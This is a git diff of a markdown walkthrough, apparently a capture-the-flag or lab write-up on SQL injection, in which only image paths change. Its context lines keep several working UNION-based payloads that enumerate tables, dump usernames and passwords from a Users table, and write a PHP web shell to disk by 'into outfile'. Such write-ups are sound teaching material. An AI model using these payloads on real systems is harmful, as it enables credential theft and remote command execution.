@@ -70,7 +70,7 @@ This payload alters the logic of the original query, causing the invitation code
 
 As a result, the system accepts the invitation code without properly validating it, allowing us to **bypass the registration mechanism** and successfully create a user account.
 
-<img src="/budahacksecurity_static/uploads/md_images/database/sql.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/database/sql.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -155,7 +155,7 @@ admin') UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES
 WHERE table_schema='chattr'-- -
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/database/sql2.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/database/sql2.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -169,7 +169,7 @@ After identifying a potentially sensitive table (`Users`), we enumerate its colu
 admin') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/database/sql3.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/database/sql3.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -198,7 +198,7 @@ We do this again using UNION-based SQL injection, directly targeting the `Users`
 admin') UNION SELECT 1,2,Password,User FROM chattr.Users-- -
 ```
 
-<img src="/budahacksecurity_static/uploads/md_images/database/sql4.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/database/sql4.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -272,6 +272,6 @@ admin') union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/
 
 We obtain the flag:
 
-<img src="/budahacksecurity_static/uploads/md_images/database/sql5.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/database/sql5.png" style="max-width:100%; border-radius:8px;">
 
 ---
